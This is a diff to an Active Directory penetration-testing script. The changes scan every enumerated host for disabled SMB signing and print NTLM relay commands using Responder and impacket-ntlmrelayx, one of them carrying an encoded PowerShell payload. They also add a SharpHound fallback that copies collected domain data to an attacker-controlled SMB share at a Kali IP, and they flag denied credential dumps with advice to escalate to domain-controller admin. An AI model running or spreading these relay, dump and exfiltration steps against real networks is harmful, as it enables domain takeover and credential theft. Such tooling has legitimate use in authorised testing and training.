@@ -1242,34 +1242,55 @@ phase5_smb_signing() {
 
     build_nxc_auth
     local signing_out="${OUTDIR}/smb_signing.txt"
+    local relay_list="${OUTDIR}/smb_no_signing.txt"
 
-    # Run nxc for signing status (parsed from host line)
-    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]}"
-    timeout 30 nxc smb "$DC_IP" "${NXC_AUTH[@]}" \
+    # Build the scan target set: the DC plus every enumerated computer. Member
+    # servers are the real relay candidates — the DC almost always has signing
+    # required, so scanning only the DC finds nothing useful. Sources: LDAP
+    # dNSHostName FQDNs and any IPv4s captured during computer enumeration.
+    # Missing files are fine (degrades to a DC-only scan).
+    local targets_file="${OUTDIR}/smb_signing_targets.txt"
+    {
+        printf '%s\n' "$DC_IP"
+        grep -hoiP 'dNSHostName:\s*\K\S+' \
+            "${OUTDIR}/computers/all_computers.txt" 2>/dev/null
+        grep -hoE '([0-9]{1,3}\.){3}[0-9]{1,3}' \
+            "${OUTDIR}/computers/all_computers.txt" \
+            "${OUTDIR}/computers/nxc_computers.txt" 2>/dev/null
+    } | grep -vE '^[[:space:]]*$' | sort -u > "$targets_file"
+    local host_count; host_count=$(wc -l < "$targets_file" 2>/dev/null | tr -d ' ')
+    info "SMB signing scan across ${host_count:-1} enumerated host(s) (DC + member servers)"
+
+    # nxc accepts a file of targets (one per line) as the target argument.
+    cmd_log "nxc smb ${targets_file} ${NXC_AUTH[*]}"
+    timeout 120 nxc smb "$targets_file" "${NXC_AUTH[@]}" \
         > "$signing_out" 2>&1 || true
 
-    # Generate relay candidate list
-    local relay_list="${OUTDIR}/smb_no_signing.txt"
-    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --gen-relay-list ${relay_list}"
-    timeout 30 nxc smb "$DC_IP" "${NXC_AUTH[@]}" \
+    # Generate relay candidate list across all scanned hosts
+    cmd_log "nxc smb ${targets_file} ${NXC_AUTH[*]} --gen-relay-list ${relay_list}"
+    timeout 120 nxc smb "$targets_file" "${NXC_AUTH[@]}" \
         --gen-relay-list "$relay_list" >> "$signing_out" 2>&1 || true
 
     success "SMB signing results → smb_signing.txt"
 
     if grep -qiE "signing:False" "$signing_out" 2>/dev/null; then
         success "*** SMB SIGNING DISABLED — NTLM RELAY POSSIBLE ***"
+        info "Relay candidates (no signing) → ${relay_list}"
         echo "SMB_SIGNING_DISABLED=YES" >> "${OUTDIR}/summary_notes.txt"
-        attack_cmd "NTLM RELAY (SMB signing disabled on target)" \
+        attack_cmd "NTLM RELAY (SMB signing disabled — relay to a host from smb_no_signing.txt)" \
+            "# Relay TARGETS are the no-signing hosts (member servers), not the DC:" \
+            "cat ${relay_list}" \
+            "" \
             "# Capture hashes with Responder (on separate interface):" \
             "sudo responder -I tun0 -dwv" \
             "" \
-            "# Or relay directly (no Responder):" \
-            "sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${DC_IP} -c 'whoami'" \
+            "# Or relay directly (no Responder) — point -tf at the candidate list:" \
+            "sudo impacket-ntlmrelayx --no-http-server -smb2support -tf ${relay_list} -c 'whoami'" \
             "" \
             "# Relay with PowerShell payload (generate with msfvenom/reverse shell encoder):" \
-            "sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${DC_IP} -c 'powershell -enc BASE64_ENCODED_PAYLOAD'"
+            "sudo impacket-ntlmrelayx --no-http-server -smb2support -tf ${relay_list} -c 'powershell -enc BASE64_ENCODED_PAYLOAD'"
     else
-        info "SMB signing appears enabled on DC — relay not straightforward"
+        info "SMB signing appears enabled on all scanned hosts — relay not straightforward"
         echo "SMB_SIGNING_DISABLED=NO" >> "${OUTDIR}/summary_notes.txt"
     fi
 
@@ -1279,6 +1300,33 @@ phase5_smb_signing() {
 #==============================================================================
 # PHASE 6 — BLOODHOUND COLLECTION
 #==============================================================================
+
+# Emit the SharpHound + impacket-smbserver manual-collection fallback (the
+# toolkit's stated convention, AGENTS §3) plus a hard warning. Called whenever
+# automatic collection yields no graph — the AD graph drives the AD set, so a
+# silent skip is never acceptable.
+bloodhound_manual_fallback() {
+    local reason="$1"
+    error "BloodHound graph NOT collected automatically (${reason})"
+    error "The AD graph drives the AD set — collect it MANUALLY before continuing."
+    echo "BLOODHOUND_GRAPH=MISSING" >> "${OUTDIR}/summary_notes.txt"
+    attack_cmd "BLOODHOUND — MANUAL COLLECTION (SharpHound + impacket-smbserver)" \
+        "# Convention (AGENTS §3): run SharpHound on the target, exfil the zip over SMB." \
+        "# 1. On Kali — serve a share to receive the zip:" \
+        "impacket-smbserver -smb2support share ${OUTDIR}/bloodhound" \
+        "" \
+        "# 2. Get SharpHound.exe onto the compromised domain host" \
+        "#    (BloodHound CE UI -> Collectors -> SharpHound; transfer via the share / http / certutil)" \
+        "" \
+        "# 3. On the target — collect as a domain user:" \
+        ".\\SharpHound.exe -c All --zipfilename bh.zip" \
+        "" \
+        "# 4. Copy the zip back to the Kali share, then import:" \
+        "copy bh.zip \\\\<KALI_IP>\\share\\" \
+        "# BloodHound CE -> File Ingest -> bh.zip -> Shortest Path to DA from Owned"
+    progress_log "MANUAL" "phase6_bloodhound" "${reason} — SharpHound fallback emitted"
+}
+
 phase6_bloodhound() {
     if [[ "$SKIP_BLOODHOUND" == true ]]; then
         info "BloodHound collection skipped (--skip-bloodhound)"
@@ -1297,11 +1345,9 @@ phase6_bloodhound() {
     mkdir -p "${OUTDIR}/bloodhound"
 
     if [[ "${TOOL_STATUS[bloodhound-ce-python]}" != "ok" ]]; then
-        warn "bloodhound-ce-python not found"
-        warn "Install: pip install bloodhound-ce"
-        warn "Or:      sudo apt install bloodhound-ce-python"
-        progress_log "SKIP" "$phase_key" "tool not installed"
-        return 0
+        warn "bloodhound-ce-python not found (install: sudo apt install bloodhound-ce-python)"
+        bloodhound_manual_fallback "bloodhound-ce-python not installed"
+        return 1
     fi
 
     local bh_prefix="${OUTDIR}/bloodhound/bh"
@@ -1350,9 +1396,9 @@ phase6_bloodhound() {
             "# 4. ASREPRoastable users"
         progress_log "DONE" "$phase_key" "zip=${bh_zip}"
     else
-        warn "BloodHound collection may have failed (exit ${bh_exit})"
         warn "Check: ${OUTDIR}/bloodhound/collection_output.txt"
-        progress_log "FAIL" "$phase_key" "exit=${bh_exit}"
+        bloodhound_manual_fallback "automatic collection produced no zip (exit ${bh_exit})"
+        return 1
     fi
 }
 
@@ -1720,6 +1766,14 @@ mode_chain() {
             dump_out=$(timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" "${dump_args[@]}" 2>&1) || true
             echo "$dump_out" > "${loot_dir}/${label}.txt"
 
+            # Access-denied is a privilege problem, not an empty result — say so
+            # instead of silently producing no creds and looking like "nothing here".
+            if grep -qiE "STATUS_ACCESS_DENIED|access[_ ]denied" <<< "$dump_out"; then
+                warn "  ${label}: STATUS_ACCESS_DENIED — need DC-admin (Pwn3d!) on ${nxc_target} to dump; escalate first"
+                echo "[$(date '+%H:%M:%S')] Step 4 ${label} ACCESS_DENIED — need admin on ${nxc_target}" >> "$chain_log"
+                continue
+            fi
+
             # Parse credentials from output
             echo "$dump_out" | grep -iE ":\S+:" | while IFS= read -r cred_line; do
                 success "  CRED: ${cred_line}"
@@ -1812,7 +1866,12 @@ mode_chain() {
         fi
 
         if [[ "$hashes_found" == false ]]; then
-            warn "No NTLM hashes found in loot — skip or get admin access first"
+            if grep -qiE "STATUS_ACCESS_DENIED|access[_ ]denied" "${loot_dir}"/*.txt 2>/dev/null; then
+                warn "Credential dump was DENIED (STATUS_ACCESS_DENIED) — you need DC-admin (Pwn3d!) to dump."
+                warn "Escalate to admin on ${DC_IP} first, then re-run --chain from Step 4."
+            else
+                warn "No NTLM hashes found in loot — skip or get admin access first"
+            fi
         fi
 
         rm -f "$hash_tmp" "$sam_users_tmp"
